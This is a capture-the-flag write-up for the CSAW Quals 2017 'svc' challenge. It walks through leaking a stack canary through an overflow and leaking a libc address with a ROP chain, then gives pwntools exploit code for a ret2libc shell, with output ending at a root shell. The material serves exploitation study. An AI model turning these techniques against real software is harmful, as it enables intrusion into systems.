# CSAW Quals 2017 svc

Looking over ```checksec```:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

In this challenge we are given a ```libc``` file. Sounds like some return oriented programming!

Running the binary and decompiling it we can see that there are 3 options:
- ```FEED SVC```, which takes our input
- ```REVIEW THE FOOD```, which outputs to the screen our input with a call to ```puts()```
- ```MINE MINERALS```, which exits the program

We can make a good guess and say that we will have to have an information leak in our program. We also notice that there is a ```canary``` on the stack. We will overflow just enough so that when we select ```REVIEW THE FOOD``` it will leak it for us.

Since this is a 64bit binary, our ```canary``` will also be 64 bits - 8 bytes. We know that the lowest byte in memory of it will be a NULL byte, as to stop string functions like ```puts()```, therefore we will have to overflow it as well in order to leak the other 7 bytes.

Finally, we need a libc address leak. Since the only way we can leak stuff is with ```puts()```, we will have to change the argument that is loaded in ```rdi``` to a pointer to a libc address. We can use a GOT address for this. With these in mind, we will construct a small ```ropchain``` that will overwrite ```ret```:

```python
	r.sendline("1")
	r.send("A" * 168 + canary + "B" * 8 + p64(pop_rdi) + p64(exe.got['puts']) + p64(exe.symbols['puts']) + p64(function_addr))
	r.sendline("3")
```

```function_addr``` is the address to the start of the "main" function. After we leak it we go back into the program and use our freshly leaked bytes to construct a ret2libc attack.

```python
    libc.address = leak - libc.symbols['puts']
    system = libc.symbols['system']
    binsh = next(libc.search('/bin/sh\x00'))

    r.sendline("1")
    r.send("A" * 168 + canary + "B" * 8 + p64(pop_rdi) + p64(binsh) + p64(system))
    r.sendline("3")
```

```bash
[root@pwn:~/csawquals17_svc]$ python solve.py LOCAL
[+] Starting local process '/root/code/CTF-Writeups/csawquals17_svc/ld-2.23.so': pid 2051
[*] canary: 004b88fc629067e7
[*] leak: 0x7f5772d8b690
[*] Switching to interactive mode

-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>-------------------------
[*]SCV IS ALWAYS HUNGRY.....
-------------------------
[*]GIVE HIM SOME FOOD.......
-------------------------
>>-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>[*]BYE ~ TIME TO MINE MIENRALS...
$ whoami
root
```
